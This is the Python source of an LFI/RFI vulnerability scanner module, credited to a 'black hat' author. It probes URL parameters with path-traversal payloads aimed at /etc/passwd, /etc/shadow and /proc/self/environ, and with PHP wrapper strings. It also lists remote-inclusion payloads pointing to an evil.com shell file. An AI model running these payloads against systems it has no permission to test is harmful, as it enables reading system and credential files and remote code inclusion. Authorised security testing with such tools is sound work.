# modules/vuln_scanner/lfi_rfi_scanner.py

"""
LFI/RFI Vulnerability Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects Local and Remote File Inclusion vulnerabilities
through path traversal and wrapper injection.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class LFIRFIScanner:
    """
    LFI/RFI vulnerability scanner.
    
    Tests for local and remote file inclusion using
    path traversal and PHP wrapper techniques.
    """
    
    LFI_PAYLOADS = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/etc/passwd',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....\\....\\....\\windows\\win.ini',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        '/proc/self/environ',
        '/proc/self/fd/0',
    ]
    
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        'ftp://evil.com/shell.txt',
        '//evil.com/shell.txt',
    ]
    
    LFI_OUTPUT_PATTERNS = [
        r'root:.:0:0:',
        r'daemon:.:1:1:',
        r'bin:.:2:2:',
        r'www-data',
        r'nobody:.:',
        r'\[extensions\]',
        r'\[fonts\]',
        r'PD9waHA',
        r'<?php',
    ]
    
    PARAMETER_NAMES = [
        'file', 'page', 'include', 'path', 'document',
        'folder', 'dir', 'template', 'view', 'load',
        'read', 'open', 'show', 'display', 'fetch',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the LFI/RFI scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for LFI/RFI.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.LFI_PAYLOADS[:8]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            params[parameter] = payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                for pattern in self.LFI_OUTPUT_PATTERNS:
                    if re.search(pattern, response.text):
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'type': 'lfi',
                            'payload': payload,
                            'pattern_matched': pattern,
                        }
                    
            except RequestException:
                continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run LFI/RFI scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        test_params = [p for p in params if any(pn in p.lower() for pn in self.PARAMETER_NAMES)]
        
        if not test_params:
            test_params = list(params.keys())[:5]
        
        for param_name in test_params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'Local File Inclusion (LFI)',
                'severity': 'critical',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"LFI detected via parameter '{vuln['parameter']}' with payload '{vuln['payload']}'",
                'evidence': vuln,
                'remediation': 'Use whitelist for file inclusion. Validate and sanitize user input. Disable allow_url_include.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }